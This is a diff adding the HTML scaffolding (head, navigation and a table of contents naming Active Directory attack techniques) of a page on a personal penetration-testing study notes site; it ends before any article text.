@@ -1,0 +1,3247 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://gbarbakadz.github.io/HackTheBox%20Materials/Active%20Directory%20Enumeration%5CAttacks/">
+      
+      
+        <link rel="prev" href="../..">
+      
+      
+        <link rel="next" href="../Attacking%20Web%20Applications%20with%20FFUF/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.0">
+    
+    
+      
+        <title>Active Directory Enumeration/Attacks - Infosec Docs</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.618322db.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../Stylesheet/custom.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="deep-orange">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#active-directory-enumerationattacks" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Infosec Docs" class="md-header__button md-logo" aria-label="Infosec Docs" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m23 11.5-3.05-1.13c-.26-1.15-.91-1.81-.91-1.81a4.19 4.19 0 0 0-5.93 0l-1.48 1.48L5 3c-1 4 0 8 2.45 11.22L2 19.5s8.89 2 14.07-2.05c2.76-2.16 3.38-3.42 3.77-4.75zm-5.29.22c-.39.39-1.03.39-1.42 0a.996.996 0 0 1 0-1.41c.39-.39 1.03-.39 1.42 0s.39 1.02 0 1.41"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Infosec Docs
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Active Directory Enumeration/Attacks
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="deep-orange"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="deep-purple"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Infosec Docs" class="md-nav__button md-logo" aria-label="Infosec Docs" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m23 11.5-3.05-1.13c-.26-1.15-.91-1.81-.91-1.81a4.19 4.19 0 0 0-5.93 0l-1.48 1.48L5 3c-1 4 0 8 2.45 11.22L2 19.5s8.89 2 14.07-2.05c2.76-2.16 3.38-3.42 3.77-4.75zm-5.29.22c-.39.39-1.03.39-1.42 0a.996.996 0 0 1 0-1.41c.39-.39 1.03-.39 1.42 0s.39 1.02 0 1.41"/></svg>
+
+    </a>
+    Infosec Docs
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Notes of Ertaoz Bregvadze
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    HackTheBox Materials
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    HackTheBox Materials
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory Enumeration/Attacks
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory Enumeration/Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#ad-enumeration-attacks-skills-assessment-part-i" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        AD Enumeration &amp; Attacks - Skills Assessment Part I
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ad-enumeration-attacks-skills-assessment-part-ii" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        AD Enumeration &amp; Attacks - Skills Assessment Part II
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tools-of-the-trade" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tools of the Trade
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#initial-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Initial Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#llmnrntb-ns-poisoning" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        LLMNR/NTB-NS Poisoning
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#password-spraying-password-policies" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Password Spraying &amp; Password Policies
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumerating-security-controls" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumerating Security Controls
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#credentialed-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Credentialed Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration-by-living-off-the-land" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeration by Living Off the Land
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#transfering-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Transfering Files
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#kerberoasting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Kerberoasting
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#acl-enumeration-tactics" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ACL Enumeration &amp; Tactics
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dcsync" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        DCSync
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privileged-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privileged Access
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#nopac" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        NoPac
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#printnightmare" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PrintNightmare
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#petitpotam" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PetitPotam
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#miscellaneous-misconfigurations" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Miscellaneous Misconfigurations
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#group-policy-enumeration-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Group Policy Enumeration &amp; Attacks
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#asreproasting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ASREPRoasting
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#trust-relationships-child-parent-trusts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Trust Relationships - Child &gt; Parent Trusts
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#trust-relationships-cross-forest" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Trust Relationships - Cross-Forest
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#harnessing-powershell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Harnessing PowerShell
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Attacking%20Web%20Applications%20with%20FFUF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Attacking Web Applications with FFUF
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../FIle%20Inclusion%5CPath%20Traversal/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Inclusion/Path Traversal
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Getting%20Started%20-%20General/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Getting Started - General
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Login%20Brute%20Forcing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Login Brute Forcing Cheat Sheet
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL%20Injection%20Fundamentals/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OSCP Materials
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    OSCP Materials
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../OSCP%20Materials/OSCP_Cheatsheet/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OSCP CheatSheet
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    eCPPT Materials
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    eCPPT Materials
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../eCPPT%20Materials/Linux%20Exploitation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux Exploitation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../eCPPT%20Materials/Network%20Security/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Network Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../eCPPT%20Materials/Powershell%20For%20Pentesting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Powershell For Pentesting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../eCPPT%20Materials/Ruby%20%26%20Metasploit/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Ruby & Metasploit
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../eCPPT%20Materials/System%20Security/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    System Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../eCPPT%20Materials/WIFI%20Security/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    WIFI Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../eCPPT%20Materials/Web%20App%20Security/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web App Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    eMAPT
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    eMAPT
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../eMAPT/Mobile%20Application%20Security%20Testing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Mobile Application Security Testing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#ad-enumeration-attacks-skills-assessment-part-i" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        AD Enumeration &amp; Attacks - Skills Assessment Part I
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ad-enumeration-attacks-skills-assessment-part-ii" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        AD Enumeration &amp; Attacks - Skills Assessment Part II
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tools-of-the-trade" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tools of the Trade
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#initial-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Initial Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#llmnrntb-ns-poisoning" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        LLMNR/NTB-NS Poisoning
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#password-spraying-password-policies" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Password Spraying &amp; Password Policies
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumerating-security-controls" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumerating Security Controls
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#credentialed-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Credentialed Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration-by-living-off-the-land" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeration by Living Off the Land
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#transfering-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Transfering Files
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#kerberoasting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Kerberoasting
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#acl-enumeration-tactics" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ACL Enumeration &amp; Tactics
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dcsync" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        DCSync
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privileged-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privileged Access
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#nopac" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        NoPac
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#printnightmare" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PrintNightmare
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#petitpotam" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PetitPotam
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#miscellaneous-misconfigurations" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Miscellaneous Misconfigurations
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#group-policy-enumeration-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Group Policy Enumeration &amp; Attacks
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#asreproasting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ASREPRoasting
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#trust-relationships-child-parent-trusts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Trust Relationships - Child &gt; Parent Trusts
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#trust-relationships-cross-forest" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Trust Relationships - Cross-Forest
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#harnessing-powershell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Harnessing PowerShell
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+                
+
+
+
+  
+
+
+  <nav class="md-path" aria-label="Navigation" >
+    <ol class="md-path__list">
+      
+        
+  
+  
+    <li class="md-path__item">
